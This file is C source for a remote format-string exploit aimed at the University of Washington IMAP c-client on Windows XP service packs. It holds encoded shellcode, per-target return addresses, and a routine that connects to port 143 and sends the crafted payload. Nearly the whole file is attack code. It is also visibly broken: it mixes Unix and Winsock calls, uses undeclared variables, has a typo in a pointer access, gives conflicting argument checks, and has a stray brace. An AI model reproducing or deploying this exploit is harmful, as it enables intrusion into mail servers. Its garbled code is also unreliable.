/*
   
 # This BUg Discover By Faryad Rahmany                                      
 # C0d3d by Faryad rahmany                                                       
 # website : http://rahmany.net                                                   
 # University Of Washington IMAP c-client Remote FOrmat String    
 # Shellcode based on work by vlad902                                         
 # Greets to my best Freind : Gholi (DJ7xpl)                                
 # UG  : File Host Port Target                                                       
 # Target 1 : WIndows XP Sp 1 : 0                                               
 # Target 2 : Windows XP Sp 2 : 1                                               
 # Target 3 : Windows XP Sp 3 : 2                                               
 # Ep  : Attack.exe 192.168.1.1 143 2                                           
 # Sp Thanks To : AllaH       
 # compiled with visual c++ 6 : Attack.c                                        
                
*/
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#define PORT 143 /* the port client will be connecting to */
#define DATAOVERFLOW 2024 

int main(int argc, char *argv[])
{

int sockfd, numbytes;
unsigned int system;
char buffer[DATAOVERFLOW];
char jmp[5];
struct hostent *he;
struct sockaddr_in tcp;;
struct sockaddr_in their_addr; /* connector's address information */
char winxpsp1[] = "\x57\x94\xAE\x77"; // not tested
char winxpsp2[] = "\xED\x1E\x94\x7C";
char winxpsp3[] = "\x7B\x46\x86\x7C";
char FAR[] = "\x47\x45\x54\x20\x2F";
WSADATA wsadata;


unsigned char shellcode[] =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x46\x4b\x4e"
"\x4d\x54\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x48"
"\x4e\x56\x46\x32\x46\x42\x4b\x48\x45\x44\x4e\x43\x4b\x38\x4e\x57"
"\x45\x50\x4a\x57\x41\x50\x4f\x4e\x4b\x38\x4f\x54\x4a\x41\x4b\x48"
"\x4f\x55\x42\x32\x41\x30\x4b\x4e\x49\x34\x4b\x48\x46\x53\x4b\x48"
"\x41\x30\x50\x4e\x41\x53\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"
"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x43\x46\x35\x46\x42\x4a\x52\x45\x47\x45\x4e\x4b\x48"
"\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x34"
"\x4b\x58\x4f\x35\x4e\x31\x41\x30\x4b\x4e\x43\x30\x4e\x42\x4b\x38"
"\x49\x38\x4e\x36\x46\x52\x4e\x51\x41\x46\x43\x4c\x41\x53\x4b\x4d"
"\x46\x56\x4b\x38\x43\x44\x42\x33\x4b\x58\x42\x44\x4e\x50\x4b\x58"
"\x42\x47\x4e\x41\x4d\x4a\x4b\x58\x42\x34\x4a\x50\x50\x45\x4a\x56"
"\x50\x58\x50\x54\x50\x50\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x46"
"\x43\x35\x48\x46\x4a\x36\x43\x53\x44\x53\x4a\x46\x47\x47\x43\x47"
"\x44\x33\x4f\x55\x46\x55\x4f\x4f\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e"
"\x4e\x4f\x4b\x33\x42\x55\x4f\x4f\x48\x4d\x4f\x55\x49\x58\x45\x4e"
"\x48\x56\x41\x38\x4d\x4e\x4a\x50\x44\x50\x45\x35\x4c\x36\x44\x50"
"\x4f\x4f\x42\x4d\x4a\x36\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x55"
"\x4f\x4f\x48\x4d\x43\x45\x43\x55\x43\x45\x43\x45\x43\x35\x43\x54"
"\x43\x55\x43\x54\x43\x55\x4f\x4f\x42\x4d\x48\x36\x4a\x56\x41\x31"
"\x4e\x45\x48\x56\x43\x45\x49\x48\x41\x4e\x45\x59\x4a\x46\x46\x4a"
"\x4c\x31\x42\x47\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x56\x42\x51"
"\x41\x35\x45\x35\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x52"
"\x49\x4e\x47\x35\x4f\x4f\x48\x4d\x43\x35\x45\x55\x4f\x4f\x42\x4d"
"\x4a\x36\x45\x4e\x49\x34\x48\x58\x49\x34\x47\x55\x4f\x4f\x48\x4d"
"\x42\x45\x46\x55\x46\x55\x45\x55\x4f\x4f\x42\x4d\x43\x49\x4a\x56"
"\x47\x4e\x49\x47\x48\x4c\x49\x57\x47\x45\x4f\x4f\x48\x4d\x45\x35"
"\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x46\x48\x46\x4a\x56\x43\x46"
"\x4d\x46\x49\x48\x45\x4e\x4c\x56\x42\x35\x49\x35\x49\x32\x4e\x4c"
"\x49\x58\x47\x4e\x4c\x36\x46\x54\x49\x48\x44\x4e\x41\x43\x42\x4c"
"\x43\x4f\x4c\x4a\x50\x4f\x44\x44\x4d\x42\x50\x4f\x44\x54\x4e\x32"
"\x43\x59\x4d\x58\x4c\x47\x4a\x53\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
"\x44\x47\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x37\x46\x54\x4f\x4f"
"\x48\x4d\x4b\x35\x47\x35\x44\x45\x41\x55\x41\x55\x41\x45\x4c\x56"
"\x41\x50\x41\x45\x41\x55\x45\x35\x41\x35\x4f\x4f\x42\x4d\x4a\x46"
"\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x55\x4f\x4f\x48\x4d\x4c\x36"
"\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x48\x47\x55\x4e\x4f"
"\x43\x38\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x35\x4f\x4f\x42\x4d"
"\x4a\x46\x42\x4f\x4c\x38\x46\x50\x4f\x45\x43\x45\x4f\x4f\x48\x4d"
"\x4f\x4f\x42\x4d\x5a";

if(argc < 3){
                   printf("*********************************************** \n"
                "  This BUg Discover By Faryad Rahmany                                      \n"
                "  C0d3d by Faryad rahmany                                                       \n"
                "  website : http://rahmany.net                                                   \n"
                "  University Of Washington IMAP c-client Remote FOrmat String    \n"
                "  Shellcode based on work by vlad902                                         \n"
                "  Greets to my best Freind : Gholi (DJ7xpl)                                \n"
                "  UG  : File Host Port Target                                                       \n"
                "  Target 1 : WIndows XP Sp 1 : 0                                               \n"
                "  Target 2 : Windows XP Sp 2 : 1                                               \n"
                "  Target 3 : Windows XP Sp 3 : 2                                               \n"
                "  Ep  : Attack.exe 192.168.1.1 143 2                                           \n"
                "  Sp Thanks To : AllaH                                                              \n"
                "  compiled with visual c++ 6 : Attack.c                                        \n"
                "***********************************************\n",
                             argv[1]);
                exit(-1);
                }
printf("\n Attack on University Of Washington IMAP c-client");
system = (unsigned short)atoi(argv[3]);
switch(system)
{
case 1:
strcat(jmp,winxpsp1);
break;
case 2:
strcat(jmp,winxpsp2);
break;
case 3 :
strcat(jmp,winxpsp3);
break;
default:
printf("\n\r this target not find this list and exit \n\r");
exit(-1);
}
printf(" building Format string \n");
memset(buffer,shellcode,DATAOVERFLOW);
memcpy(buffer,shellcode,sizeof(shellcode)-1);
memcpy(buffer+256,jmp,sizeof(jmp)-1);
memcpy(buffer+243,FAR,sizeof(FAR)-1);
buffer[DATAOVERFLOW] = 0;
if (argc != 2) {
fprintf(stderr,"usage: client hostname\n");
exit(1);
}
if ((he=gethostbyname(argv[1])) == NULL) { /* get the host info */
herror("gethostbyname");
exit(1);
}
  if ((!he)  && (addr == INADDR_NONE) ){
        printf("unable to resolve %s\n",argv[1]);
   exit(-1);
  }
         sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if (!sock){ 
        printf("Fuck socket error\n");
   exit(-1);
  }
  printf("\nAttack on University Of Washington IMAP c-client  %s\n" , argv[1]) ;
  Sleep(900);
  printf("\npachet Send size = %d byte\n" , sizeof(buffer));
if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
perror("socket");
exit(1);
}
 if ( WSAStartup(wVersionRequested, &wsadata) )
 {
 printf ("Erreur d'initialisation winsock !\n");
 ExitProcess (1);
        }
their_addr.sin_family = AF_INET; /* host byte order */
their_addr.sin_port = htons(PORT); /* short, network byte order */
their_addr.sin_addr = *((struct in_addr *)he-h_addr);
bzero(&(their_addr.sin_zero), 8); /* zero the rest of the struct */
printf("\nSending exploit string...\n");
printf ("connecting to %s on port %u...", argv[1], ntohs ( sin.sin_port ) );
if (connect(sockfd, (struct sockaddr *)&their_addr, \
sizeof(struct sockaddr)) == -1) {
perror("connect");
exit(1);
}
fprintf(FILEsock,
"\xeb\x29"
"%%8x%%8x%%8x%%8x%%8x%%8x%%8x%%8x%%%dd%%n%%n@@@@@@@@%s\r\n",
0x3C63FF-0x4f,shellcode);
if ((numbytes=recv(sockfd, buffer,DATAOVERFLOW, 0)) == -1) {
perror("recv");
exit(1);
}
buffer[numbytes] = '\0';
printf("Received: %s",buf);
  shutdown(sockfd,1);
  closesocket(sockfd);
  }
return 0;
}
